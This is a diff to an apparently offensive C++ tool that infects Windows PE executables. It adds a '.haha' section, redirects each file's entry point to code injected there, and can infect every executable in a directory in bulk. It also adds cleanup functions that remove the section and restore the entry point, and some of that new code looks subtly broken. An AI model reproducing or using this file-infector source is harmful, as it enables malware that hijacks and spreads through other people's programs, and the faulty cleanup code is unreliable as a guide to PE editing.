@@ -9,13 +9,16 @@
 #include <filesystem>
 #include <sys/stat.h>
 #pragma comment(lib, "User32.lib")
+extern DWORD dwEntryPoint = 0;
 
+//align address
 DWORD align(DWORD size, DWORD align, DWORD addr) {
 	if (!(size % align))
 		return addr + size;
 	return addr + (size / align + 1) * align;
 }
 
+// add a new section to the PE 
 int AddSection(LPCSTR filepath, char const* sectionName, DWORD sizeOfSection) {
 	HANDLE file = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (file == INVALID_HANDLE_VALUE) {
@@ -92,6 +95,7 @@ int AddSection(LPCSTR filepath, char const* sectionName, DWORD sizeOfSection) {
 	return 1;
 }
 
+// add new code to the new section above
 bool AddCodeToSection(LPCSTR filepath, char const* sectionName) {
 	HANDLE file = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (file == INVALID_HANDLE_VALUE) {
@@ -113,6 +117,9 @@ bool AddCodeToSection(LPCSTR filepath, char const* sectionName) {
 	SetFilePointer(file, 0, 0, FILE_BEGIN);
 	//lets save the OEP
 	DWORD OEP = nt->OptionalHeader.AddressOfEntryPoint + nt->OptionalHeader.ImageBase;
+	// save entry point to global variable
+	dwEntryPoint = OEP;
+	
 	//we change the EP to point to the last section created
 	nt->OptionalHeader.AddressOfEntryPoint = last->VirtualAddress;
 	WriteFile(file, pByte, filesize, &dw, 0);
@@ -335,18 +342,40 @@ bool AddCodeToSection(LPCSTR filepath, char const* sectionName) {
 	return true;
 }
 
-bool removeCode(LPCSTR filepath, char const* sectionName) {
-	std::cout << "Removing code from section " << sectionName << std::endl;
-	//remove section and update headers
-	HANDLE file = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (file == INVALID_HANDLE_VALUE) {
-		std::cout << "Failed to open file" << std::endl;
+
+//get entry point of the infected PE
+DWORD getOEP(LPCSTR file) {
+	HANDLE hFile = CreateFileA(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) {
+		return 0;
+	}
+	DWORD dw;
+	IMAGE_DOS_HEADER dos;
+	IMAGE_NT_HEADERS nt;
+	ReadFile(hFile, &dos, sizeof(IMAGE_DOS_HEADER), &dw, NULL);
+	SetFilePointer(hFile, dos.e_lfanew, NULL, FILE_BEGIN);
+	ReadFile(hFile, &nt, sizeof(IMAGE_NT_HEADERS), &dw, NULL);
+	CloseHandle(hFile);
+	return nt.OptionalHeader.AddressOfEntryPoint;
+}
+
+	
+// restore entry point of infected PE to original value 
+bool restoreEP(LPCSTR file, DWORD OEP) {
+	HANDLE hFile = CreateFileA(file, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) {
 		return false;
 	}
 	DWORD dw;
 	IMAGE_DOS_HEADER dos;
 	IMAGE_NT_HEADERS nt;
-	
+	ReadFile(hFile, &dos, sizeof(IMAGE_DOS_HEADER), &dw, NULL);
+	SetFilePointer(hFile, dos.e_lfanew, NULL, FILE_BEGIN);
+	ReadFile(hFile, &nt, sizeof(IMAGE_NT_HEADERS), &dw, NULL);
+	nt.OptionalHeader.AddressOfEntryPoint = OEP;
+	SetFilePointer(hFile, dos.e_lfanew, NULL, FILE_BEGIN);
+	WriteFile(hFile, &nt, sizeof(IMAGE_NT_HEADERS), &dw, NULL);
+	CloseHandle(hFile);
 	return true;
 }
 
@@ -451,7 +480,81 @@ bool DumpPEHeader(LPCSTR filename)
 	}
 }
 
+// remove section from infected PE file
+bool removeSection(LPCSTR fileName, char const* sectionName) {
+	HANDLE file = CreateFile(fileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (file == INVALID_HANDLE_VALUE)
+	{
+		printf("CreateFile failed with error %d", GetLastError());
+		return FALSE;
+	}
+	HANDLE hMap = CreateFileMapping(file, NULL, PAGE_READWRITE, 0, 0, NULL);
+	if (hMap == NULL)
+	{
+		printf("CreateFileMapping failed with error %d", GetLastError());
+		return FALSE;
+	}
+	LPVOID lpBase = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
+	if (lpBase == NULL)
+	{
+		printf("MapViewOfFile failed with error %d", GetLastError());
+		return FALSE;
+	}
+	DWORD dw = 0;
+	DWORD fileSize = GetFileSize(file, NULL);
+	unsigned char* pByte = (unsigned char*)malloc(fileSize);
+	if (pByte == NULL)
+	{
+		printf("malloc failed with error %d", GetLastError());
+		return FALSE;
+	}
+	ReadFile(file, pByte, fileSize, &dw, NULL);
+	if (dw != fileSize)
+	{
+		printf("ReadFile failed with error %d", GetLastError());
+		return FALSE;
+	}
+	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
+	if (dos->e_magic != IMAGE_DOS_SIGNATURE)
+	{
+		printf("dos->e_magic != IMAGE_DOS_SIGNATURE");
+		return FALSE;
+	}
+	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew);
+	if (nt->Signature != IMAGE_NT_SIGNATURE)
+	{
+		printf("nt->Signature != IMAGE_NT_SIGNATURE");
+		return FALSE;
+	}
+	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
+	PIMAGE_SECTION_HEADER last = section + nt->FileHeader.NumberOfSections - 1;
+	nt->OptionalHeader.AddressOfEntryPoint = nt->OptionalHeader.AddressOfEntryPoint - section->VirtualAddress + last->VirtualAddress + last->Misc.VirtualSize;
+	SetFilePointer(file, 0, NULL, FILE_BEGIN);
+	UnmapViewOfFile(lpBase);
+	CloseHandle(hMap);
+	WriteFile(file, pByte, fileSize, &dw, NULL);
+
+	SetFilePointer(file, 0, NULL, FILE_BEGIN);
+	for (int i = 0; i < nt->FileHeader.NumberOfSections; i++)
+	{
+		if (strcmp((char*)section[i].Name, sectionName) == 0)
+		{
+			memmove(&section[i], &section[i + 1], (nt->FileHeader.NumberOfSections - i - 1) * sizeof(IMAGE_SECTION_HEADER));
+			nt->FileHeader.NumberOfSections -= 1;
+			nt->OptionalHeader.SizeOfImage -= sizeof(IMAGE_SECTION_HEADER);
+			nt->OptionalHeader.SizeOfHeaders -= sizeof(IMAGE_SECTION_HEADER);
+			break;
+		}
+	}
+	SetEndOfFile(file);
+	WriteFile(file, pByte, fileSize, &dw, NULL);
+	CloseHandle(file);
+	return TRUE;
+}
+
+
 void menu() {
+	std::cout << "0. Exit" << std::endl;
 	std::cout << "1. Add Section" << std::endl;
 	std::cout << "2. PE Injection" << std::endl;
 	std::cout << "3. Inject Multiple Files" << std::endl;
@@ -460,89 +563,100 @@ void menu() {
 }
 
 int main(int argc, char* argv[]) {
-	if (argc != 2) {
-		printf(" [!] Usage: %s <file/directory>\r ", argv[0]);
-		return 0;
-	}
-	try
+	int choice;
+	std::string fileName;
+	const char* sectionName = ".haha";
+	std::cout << "Enter the file name: ";
+	std::cin >> fileName;
+	std::cout << fileName << std::endl;
+	DWORD oldEP = getOEP((LPCSTR)fileName.c_str());
+	std::cout << "Old EP: " << std::hex << oldEP << std::endl;
+	do
 	{
-		menu();
-		int choice;
-		std::cin >> choice;
-		switch (choice)
+		try
 		{
-		case 1:
-		{
-			LPCSTR filename = argv[1];
-			const char* sectionName = ".haha";
-			std::cout << "Adding section into file " << filename << std::endl;
-			int addRes = AddSection(filename, sectionName, 0x1000);
-			switch (addRes) {
-			case 0:
-				printf("[-] Error adding section: File not found or in use!\n");
-				break;
+			menu();
+			std::cout << "Enter your choice: ";
+			std::cin >> choice;
+			switch (choice)
+			{
 			case 1:
-				printf("[+] Section added!\n");
-				break;
-			case -1:
-				printf("[-] Error adding section: Invalid path or PE format!\n");
-				break;
-			case -2:
-				printf("[-] Error adding section: Section already exists!\n");
-				break;
-			case -3:
-				printf("[-] Error: x64 PE detected! This version works only with x86 PE's!\n");
+			{
+				std::cout << "Adding section into file " << fileName << std::endl;
+				int addRes = AddSection((LPCSTR)fileName.c_str(), sectionName, 0x1000);
+				switch (addRes) {
+				case 0:
+					printf("[-] Error adding section: File not found or in use!\n");
+					break;
+				case 1:
+					printf("[+] Section added!\n");
+					break;
+				case -1:
+					printf("[-] Error adding section: Invalid path or PE format!\n");
+					break;
+				case -2:
+					printf("[-] Error adding section: Section already exists!\n");
+					break;
+				case -3:
+					printf("[-] Error: x64 PE detected! This version works only with x86 PE's!\n");
+					break;
+				}
+				std::cout << "Done" << std::endl;
 				break;
 			}
-			std::cout << "Done" << std::endl;
-			break;
-		}
-		case 2: {
-			LPCSTR filename = argv[1];
-			const char* sectionName = ".haha";
-			std::cout << "[!] Injecting Code into file " << filename << std::endl;
-			bool injectRes = AddCodeToSection(filename, sectionName);
-			if (injectRes)
-				printf("[+] Code injected!\n");
-			else
-				printf("[-] Error injecting code!\n");
-			break;
-		}
-		case 3: {
-			std::cout << "[!] Injecting new Section & Code into all files in directory " << argv[1] << std::endl;
-			const char* sectionName = ".haha";
-			std::vector<std::string> files;
-			getFilePath(files, argv[1]);
-			for (auto const& file : files) {
-				std::cout << "[!] Injecting into file " << file << std::endl;
-				int addRes = AddSection(file.c_str(), sectionName, 0x1000);
-				if (addRes == 1) {
-					bool injectRes = AddCodeToSection(file.c_str(), sectionName);
-					if (injectRes)
-						printf("[+]Code injected!\n");
-					else
-						printf("[-] Error injecting code!\n");
+			case 2: {
+				std::cout << "[!] Injecting Code into file " << fileName << std::endl;
+				bool injectRes = AddCodeToSection((LPCSTR)fileName.c_str(), sectionName);
+				if (injectRes)
+					printf("[+] Code injected!\n");
+				else
+					printf("[-] Error injecting code!\n");
+				break;
+			}
+			case 3: {
+				std::cout << "[!] Injecting new Section & Code into all files in directory " << argv[1] << std::endl;
+				std::vector<std::string> files;
+				getFilePath(files, argv[1]);
+				for (auto const& file : files) {
+					std::cout << "[!] Injecting into file " << file << std::endl;
+					int addRes = AddSection(file.c_str(), sectionName, 0x1000);
+					if (addRes == 1) {
+						bool injectRes = AddCodeToSection(file.c_str(), sectionName);
+						if (injectRes)
+							printf("[+]Code injected!\n");
+						else
+							printf("[-] Error injecting code!\n");
+					}
+				}
+				std::cout << "Done!" << std::endl;
+				break;
+			}
+			case 4: {
+				std::cout << "[!] Dumping PE File Information" << std::endl;
+				DumpPEHeader((LPCSTR)fileName.c_str());
+				break;
+			}
+			case 5: {
+				if (removeSection((LPCSTR)fileName.c_str(), sectionName)) {
+					std::cout << "[+] Section removed!" << std::endl;
+					if (restoreEP((LPCSTR)fileName.c_str(), oldEP)) {
+						std::cout << "[+] EP restored!" << std::endl;
+					}
+					else {
+						std::cout << "[-] Error restoring EP!" << std::endl;
+					}
+				}
+				else {
+					std::cout << "[-] Error removing section!" << std::endl;
 				}
 			}
-			std::cout << "Done!" << std::endl;
-			break;
+			}
 		}
-		case 4: {
-			std::cout << "[!] Dumping PE File Information" << std::endl;
-			DumpPEHeader(argv[1]);
-			break;
+		catch (const std::exception&)
+		{
+			std::cout << "[-] Error: Exception \r\n ";
 		}
-		case 5:
-			LPCSTR filename = argv[1];
-			const char* sectionName = ".haha";
-			removeCode(argv[1], sectionName);
-			break;
-		}
-	}
-	catch (const std::exception&)
-	{
-		std::cout << "[-] Error: Exception \r\n ";
-	}
-	
+	} while (choice != 0);
 	return 0;
 }
+// add registry 
